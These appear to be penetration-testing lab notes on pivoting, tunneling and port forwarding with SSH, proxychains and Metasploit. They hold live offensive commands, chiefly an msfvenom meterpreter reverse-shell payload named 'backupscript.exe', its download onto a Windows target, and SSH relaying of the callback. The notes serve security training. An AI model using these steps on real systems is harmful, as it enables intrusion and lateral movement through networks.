# Pivoting, Tunneling, and Port Forwarding
- [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
    - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
    - [Dynamic port forwarding with SSH over SOCKS](#dynamic-port-forwarding-with-ssh-over-socks)
- [Remote/Reverse Port Forwarding with SSH](#remotereverse-port-forwarding-with-ssh)


![Pivoting](/images/PivotingandTunnelingVisualized.gif)

> [!NOTE]
> Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments.

> [!TIP]
> Use [Draw.io](https://app.diagrams.net/) to build a visual of the network environment


## Dynamic Port Forwarding with SSH and SOCKS Tunneling
### SSH Local Port Forwarding
```bash
# Local port forwarding
ssh -L LOCAL_PORT:SERVER:PORT HOST@TARGET_IP
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Forwarding multiple ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Confirming Port Forward with Netstat
netstat -antp
```
- The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. 

### Dynamic port forwarding with SSH over SOCKS 
- Using Dynamic port forwarding we can send packets to a remote network via a pivot host.
- SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that.
- We do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network after connecting to the target host.

- Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host.

- To inform proxychains that we must use specific port, we must modify the proxychains configuration file located at `/etc/proxychains.conf`.
![SSH Tunneling over SOCKS Proxy](/images/SSH%20tunneling%20over%20socks%20proxy.png)

```bash
# Enabling Dynamic Port Forwarding with SSH
ssh -D 9050 -C -N -f ubuntu@10.129.202.64

# -C — compress all data;
# -N — do not execute remote command or shell;
# -f — run in background.

# We add socks5 127.0.0.1 9050 to the last line of /etc/proxychains.conf file
sudo nano /etc/proxychains.conf
socks5 127.0.0.1 9050

# Using Nmap with Proxychains
proxychains nmap -v -sn 172.16.5.1-200

# We can also use other tools with proxychains
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

```

> [!NOTE]
> This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling.


> [!WARNING]
> One more important note to remember here is that we can only perform a full TCP connect scan over proxychains.

## Remote/Reverse Port Forwarding with SSH
![Remote Port Forwarding](/images/Remote%20port%20forwarding.png)
- **Steps**
1. Creating a Windows Payload with msfvenom (LPORT is listener port of Pivot host): `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

2. Configuring & Starting the multi/handler: `set payload windows/x64/meterpreter/reverse_https` , `set lhost 0.0.0.0` , `set lport 8000`

3. Transferring Payload to Pivot Host: `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`

4. Starting Python3 Webserver on Pivot Host: `python3 -m http.server 8123`

5. Downloading Payload from Windows Target: `PS C:\Windows\system32> Invoke-WebRequest -Uri "http://<InternalPivotHostIP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`

6. We will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

## Meterpreter Tunneling & Port Forwarding
- **Steps**
1. Scanning Internal Network: 
- Assume that we have a meterpreter, we would want to perform a ping sweep on the internal network. We can do that using Meterpreter with the ping_sweep module: `meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`.

> [!TIP]
> We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify: 
> - On linux pivot host: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
> - On windows pivot host Using CMD: `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
> - On windows pivot host Using powershell: `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`

> [!NOTE]
> It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

2. Dynamic Port Forwarding: Instead of using SSH for port forwarding, we can use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host.We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session. 
    1. Configuring MSF's SOCKS Proxy:    
    ```bash
    msf6 > use auxiliary/server/socks_proxy
    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    SRVPORT => 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    SRVHOST => 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    version => 4a
    msf6 auxiliary(server/socks_proxy) > run
    ```
    2. Confirming Proxy Server is Running: `msf6 auxiliary(server/socks_proxy) > jobs`
    3. After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host, edit /etc/proxychains.conf: `socks5 127.0.0.1 9050`
    4. We need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the internal subnet and then route all our proxychains traffic.
    ```bash
    msf6 > use post/multi/manage/autoroute

    msf6 post(multi/manage/autoroute) > set SESSION 1
    SESSION => 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    SUBNET => 172.16.5.0
    msf6 post(multi/manage/autoroute) > run
    ```
    5. Listing Active Routes with AutoRoute: `meterpreter > run autoroute -p`

> [!TIP]
> It is also possible to add routes with autoroute by running autoroute from the Meterpreter session: `meterpreter > run autoroute -s 172.16.5.0/23`

    
3. Testing Proxy & Routing Functionality: `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`    

## Port Forwarding
- Using Meterpreter's portfwd module. 